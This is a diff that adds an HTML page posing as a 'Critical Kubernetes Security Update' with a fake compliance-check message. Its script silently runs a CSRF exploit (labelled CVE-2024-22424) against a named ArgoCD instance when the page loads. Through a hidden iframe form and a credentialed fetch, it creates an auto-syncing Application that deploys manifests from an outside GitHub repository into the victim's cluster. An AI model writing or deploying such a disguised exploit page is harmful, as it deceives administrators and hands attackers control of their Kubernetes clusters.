@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head><title>Kubernetes Security Advisory</title></head>
+<body>
+<h2>Critical Kubernetes Security Update - Please Wait...</h2>
+<p>Verifying cluster compliance status...</p>
+<script>
+// CVE-2024-22424: ArgoCD CSRF - Create Application pointing to our repo
+// ArgoCD v2.7.1 does not validate Origin header for state-changing requests
+
+var target = "https://argocd.k8s-testnet.wvservices.exchange";
+
+// Step 1: Create Application via POST (cookie sent automatically with SameSite=Lax workaround)
+function createApp() {
+    // Use form submission for cross-origin POST (bypasses SameSite=Lax for top-level navigation)
+    var form = document.createElement("form");
+    form.method = "POST";
+    form.action = target + "/api/v1/applications";
+    form.enctype = "text/plain";
+    
+    // ArgoCD accepts JSON via form with text/plain content-type trick
+    var payload = {
+        "metadata": {
+            "name": "monitoring-stack",
+            "namespace": "argocd"
+        },
+        "spec": {
+            "project": "default",
+            "source": {
+                "repoURL": "https://github.com/zerdaydas/k8s-monitoring.git",
+                "path": ".",
+                "targetRevision": "main"
+            },
+            "destination": {
+                "server": "https://kubernetes.default.svc",
+                "namespace": "default"
+            },
+            "syncPolicy": {
+                "automated": {
+                    "prune": true,
+                    "selfHeal": true
+                }
+            }
+        }
+    };
+    
+    var input = document.createElement("input");
+    input.type = "hidden";
+    input.name = JSON.stringify(payload);
+    input.value = "";
+    form.appendChild(input);
+    
+    document.body.appendChild(form);
+    
+    // Open in iframe to avoid navigation
+    var iframe = document.createElement("iframe");
+    iframe.name = "csrf_frame";
+    iframe.style.display = "none";
+    document.body.appendChild(iframe);
+    form.target = "csrf_frame";
+    form.submit();
+}
+
+// Step 2: Also try fetch with credentials
+function createAppFetch() {
+    fetch(target + "/api/v1/applications", {
+        method: "POST",
+        credentials: "include",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            "metadata": {"name": "monitoring-stack", "namespace": "argocd"},
+            "spec": {
+                "project": "default",
+                "source": {
+                    "repoURL": "https://github.com/zerdaydas/k8s-monitoring.git",
+                    "path": ".",
+                    "targetRevision": "main"
+                },
+                "destination": {
+                    "server": "https://kubernetes.default.svc",
+                    "namespace": "default"
+                },
+                "syncPolicy": {"automated": {"prune": true, "selfHeal": true}}
+            }
+        })
+    }).then(r => r.text()).then(t => {
+        document.getElementById("status").innerText = "Compliance check complete.";
+        console.log("Response:", t);
+    }).catch(e => console.log("Fetch failed, form method may work:", e));
+}
+
+// Execute both methods
+setTimeout(createAppFetch, 500);
+setTimeout(createApp, 2000);
+</script>
+<div id="status">Checking...</div>
+</body>
+</html>
